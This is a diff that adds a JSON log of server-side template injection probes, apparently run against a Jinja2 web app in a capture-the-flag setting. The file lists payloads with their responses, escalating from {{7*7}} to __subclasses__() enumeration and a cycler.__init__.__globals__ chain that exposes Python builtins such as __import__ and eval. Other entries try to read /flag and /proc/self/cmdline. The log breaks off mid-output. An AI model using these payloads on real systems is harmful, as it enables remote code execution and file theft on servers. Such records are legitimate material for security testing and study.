@@ -1,0 +1,1033 @@
+[
+  {
+    "kind": "engine",
+    "label": "control_mul",
+    "note": "{{7*7}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "49",
+    "length": 1401,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.855,
+    "interesting": false,
+    "flags": [],
+    "index": 0
+  },
+  {
+    "kind": "engine",
+    "label": "control_literal",
+    "note": "{{\"recipe.txt\"}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "recipe.txt",
+    "length": 1409,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.859,
+    "interesting": false,
+    "flags": [],
+    "index": 1
+  },
+  {
+    "kind": "engine",
+    "label": "control_missing_name",
+    "note": "{{recipe}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.859,
+    "interesting": false,
+    "flags": [],
+    "index": 2
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_add",
+    "note": "{{4+5}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "9",
+    "length": 1400,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.869,
+    "interesting": true,
+    "flags": [],
+    "index": 3
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_minus",
+    "note": "{{9-5}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "4",
+    "length": 1400,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.864,
+    "interesting": true,
+    "flags": [],
+    "index": 4
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_divide",
+    "note": "{{9/3}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "3.0",
+    "length": 1402,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.851,
+    "interesting": true,
+    "flags": [],
+    "index": 5
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_modulo",
+    "note": "{{9%4}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "1",
+    "length": 1400,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.852,
+    "interesting": true,
+    "flags": [],
+    "index": 6
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_power",
+    "note": "{{2**5}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "32",
+    "length": 1401,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.858,
+    "interesting": true,
+    "flags": [],
+    "index": 7
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_floor_div",
+    "note": "{{9//2}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "4",
+    "length": 1400,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.933,
+    "interesting": true,
+    "flags": [],
+    "index": 8
+  },
+  {
+    "kind": "engine",
+    "label": "arithmetic_concat",
+    "note": "{{\"A\"+\"B\"}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "AB",
+    "length": 1401,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.855,
+    "interesting": true,
+    "flags": [],
+    "index": 9
+  },
+  {
+    "kind": "engine",
+    "label": "string_multiply",
+    "note": "{{\"AB\"*3}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "ABABAB",
+    "length": 1405,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.867,
+    "interesting": true,
+    "flags": [],
+    "index": 10
+  },
+  {
+    "kind": "engine",
+    "label": "call_upper",
+    "note": "{{\"abc\".upper()}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "ABC",
+    "length": 1402,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.858,
+    "interesting": true,
+    "flags": [],
+    "index": 11
+  },
+  {
+    "kind": "engine",
+    "label": "call_replace",
+    "note": "{{\"foo\".replace(\"o\",\"i\")}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "fii",
+    "length": 1402,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.855,
+    "interesting": true,
+    "flags": [],
+    "index": 12
+  },
+  {
+    "kind": "engine",
+    "label": "method_format",
+    "note": "{{\"{}\".format(\"HELLO\")}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "HELLO",
+    "length": 1404,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.853,
+    "interesting": true,
+    "flags": [],
+    "index": 13
+  },
+  {
+    "kind": "engine",
+    "label": "bool_true",
+    "note": "{{True}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "True",
+    "length": 1403,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.852,
+    "interesting": true,
+    "flags": [],
+    "index": 14
+  },
+  {
+    "kind": "engine",
+    "label": "bool_false",
+    "note": "{{False}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "False",
+    "length": 1404,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.857,
+    "interesting": true,
+    "flags": [],
+    "index": 15
+  },
+  {
+    "kind": "engine",
+    "label": "python_none",
+    "note": "{{None}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "None",
+    "length": 1403,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.86,
+    "interesting": true,
+    "flags": [],
+    "index": 16
+  },
+  {
+    "kind": "engine",
+    "label": "python_tuple",
+    "note": "{{(1,2)}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "(1, 2)",
+    "length": 1405,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.853,
+    "interesting": true,
+    "flags": [],
+    "index": 17
+  },
+  {
+    "kind": "engine",
+    "label": "python_list",
+    "note": "{{[1,2]}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "[1, 2]",
+    "length": 1405,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.854,
+    "interesting": true,
+    "flags": [],
+    "index": 18
+  },
+  {
+    "kind": "engine",
+    "label": "python_dict",
+    "note": "{{{\"key\":\"value\"}}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "{'key': 'value'}",
+    "length": 1415,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.847,
+    "interesting": true,
+    "flags": [],
+    "index": 19
+  },
+  {
+    "kind": "engine",
+    "label": "class_string",
+    "note": "{{\"\".__class__}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'str'>",
+    "length": 1412,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.854,
+    "interesting": true,
+    "flags": [],
+    "index": 20
+  },
+  {
+    "kind": "engine",
+    "label": "class_tuple",
+    "note": "{{().__class__}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'tuple'>",
+    "length": 1414,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.864,
+    "interesting": true,
+    "flags": [],
+    "index": 21
+  },
+  {
+    "kind": "engine",
+    "label": "class_int",
+    "note": "{{(1).__class__}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'int'>",
+    "length": 1412,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.851,
+    "interesting": true,
+    "flags": [],
+    "index": 22
+  },
+  {
+    "kind": "engine",
+    "label": "class_mro",
+    "note": "{{().__class__.__mro__}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "(<class 'tuple'>, <class 'object'>)",
+    "length": 1434,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.852,
+    "interesting": true,
+    "flags": [],
+    "index": 23
+  },
+  {
+    "kind": "engine",
+    "label": "class_subclasses",
+    "note": "{{().__class__.__base__.__subclasses__()}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'sys.legacy_event_handler'>, <class 'InterpreterID'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'genericpath.ALLOW_MISSING'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.batched'>, <class 'itertools.chain'>, <class 'itertools.combinations'>, <class 'itertools.compress'>, <class 'itertools.count'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools.islice'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.starmap'>, <class 'itertools.takewhile'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'itertools.zip_longest'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class 'collections._deque_iterator'>, <class 'collections._deque_reverse_iterator'>, <class 'collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._not_given'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 'ast.AST'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class '_sre.SRE_Template'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_random.Random'>, <class '_sha2.SHA224Type'>, <class '_sha2.SHA256Type'>, <class '_sha2.SHA384Type'>, <class '_sha2.SHA512Type'>, <class '_socket.socket'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'socket.AddressFamily'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseConstants'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class 'zlib._ZlibDecompressor'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.TemporaryDirectory'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'typing._Final'>, <class 'typing._NotIterable'>, typing.Any, <class 'typing._PickleUsingNameMixin'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class '__future__._Feature'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'ast.NodeVisitor'>, <class 'dis._Unknown'>, <class 'dis.Bytecode'>, <class '_tokenize.TokenizerIter'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'importlib._abc.Loader'>, <class 'importlib.util._incompatible_extension_module_restrictions'>, <class 'jinja2.loaders.BaseLoader'>, <class 'unicodedata.UCD'>, <class 'textwrap.TextWrapper'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>]",
+    "length": 13054,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.86,
+    "interesting": true,
+    "flags": [],
+    "index": 24
+  },
+  {
+    "kind": "engine",
+    "label": "python_getcwd",
+    "note": "{{__import__(\"os\").getcwd()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.358,
+    "interesting": false,
+    "flags": [],
+    "index": 25
+  },
+  {
+    "kind": "engine",
+    "label": "python_listdir",
+    "note": "{{__import__(\"os\").listdir(\".\")}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.354,
+    "interesting": false,
+    "flags": [],
+    "index": 26
+  },
+  {
+    "kind": "engine",
+    "label": "python_list_root",
+    "note": "{{__import__(\"os\").listdir(\"/\")}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.357,
+    "interesting": false,
+    "flags": [],
+    "index": 27
+  },
+  {
+    "kind": "engine",
+    "label": "python_open_recipe",
+    "note": "{{open(\"recipe.txt\").read()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.355,
+    "interesting": false,
+    "flags": [],
+    "index": 28
+  },
+  {
+    "kind": "engine",
+    "label": "python_open_parent",
+    "note": "{{open(\"../recipe.txt\").read()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.353,
+    "interesting": false,
+    "flags": [],
+    "index": 29
+  },
+  {
+    "kind": "engine",
+    "label": "python_open_rootflag",
+    "note": "{{open(\"/flag\").read()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.351,
+    "interesting": false,
+    "flags": [],
+    "index": 30
+  },
+  {
+    "kind": "engine",
+    "label": "python_open_proc",
+    "note": "{{open(\"/proc/self/cmdline\").read()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.353,
+    "interesting": false,
+    "flags": [],
+    "index": 31
+  },
+  {
+    "kind": "engine",
+    "label": "python_builtin_open",
+    "note": "{{__builtins__[\"open\"](\"recipe.txt\").read()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.354,
+    "interesting": false,
+    "flags": [],
+    "index": 32
+  },
+  {
+    "kind": "engine",
+    "label": "python_globs",
+    "note": "{{globals()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.355,
+    "interesting": false,
+    "flags": [],
+    "index": 33
+  },
+  {
+    "kind": "engine",
+    "label": "python_vars",
+    "note": "{{vars()}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.35,
+    "interesting": false,
+    "flags": [],
+    "index": 34
+  },
+  {
+    "kind": "engine",
+    "label": "python_eval",
+    "note": "{{eval(\"7*7\")}}",
+    "statuses": [
+      "200"
+    ],
+    "nested_code": null,
+    "preview": null,
+    "length": 507,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.354,
+    "interesting": false,
+    "flags": [],
+    "index": 35
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_config",
+    "note": "{{config}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.857,
+    "interesting": false,
+    "flags": [],
+    "index": 36
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_request",
+    "note": "{{request}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.854,
+    "interesting": false,
+    "flags": [],
+    "index": 37
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_self",
+    "note": "{{self}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<TemplateReference None>",
+    "length": 1423,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.851,
+    "interesting": true,
+    "flags": [],
+    "index": 38
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_cycler",
+    "note": "{{cycler}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'jinja2.utils.Cycler'>",
+    "length": 1428,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.855,
+    "interesting": true,
+    "flags": [],
+    "index": 39
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_lipsum",
+    "note": "{{lipsum}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<function generate_lorem_ipsum at 0x7f6c9ca367a0>",
+    "length": 1448,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.852,
+    "interesting": true,
+    "flags": [],
+    "index": 40
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_undefined",
+    "note": "{{not_a_known_identifier}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "",
+    "length": 1399,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.853,
+    "interesting": false,
+    "flags": [],
+    "index": 41
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_dict_attr",
+    "note": "{{dict.__class__}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "<class 'type'>",
+    "length": 1413,
+    "extra_bytes": 0,
+    "error": null,
+    "elapsed": 0.853,
+    "interesting": true,
+    "flags": [],
+    "index": 42
+  },
+  {
+    "kind": "engine",
+    "label": "jinja_cycler_global",
+    "note": "{{cycler.__init__.__globals__}}",
+    "statuses": [
+      "200",
+      "200"
+    ],
+    "nested_code": "200",
+    "preview": "{'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6c9d827ef0>, '__spec__': ModuleSpec(name='jinja2.utils', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6c9d827ef0>, origin='/usr/local/lib/python3.12/site-packages/jinja2/utils.py'), '__file__': '/usr/local/lib/python3.12/site-packages/jinja2/utils.py', '__cached__': '/usr/local/lib/python3.12/site-packages/jinja2/__pycache__/utils.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, types, exceptions, and other objects.\\n\\nThis module provides direct access to all 'built-in'\\nidentifiers of Python; for example, builtins.len is\\nthe full name for the built-in function len().\\n\\nThis module is not normally accessed explicitly by most\\napplications, but can be useful in modules that provide\\nobjects with the same name as a built-in value, but in\\nwhich the built-in of that name is also needed.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 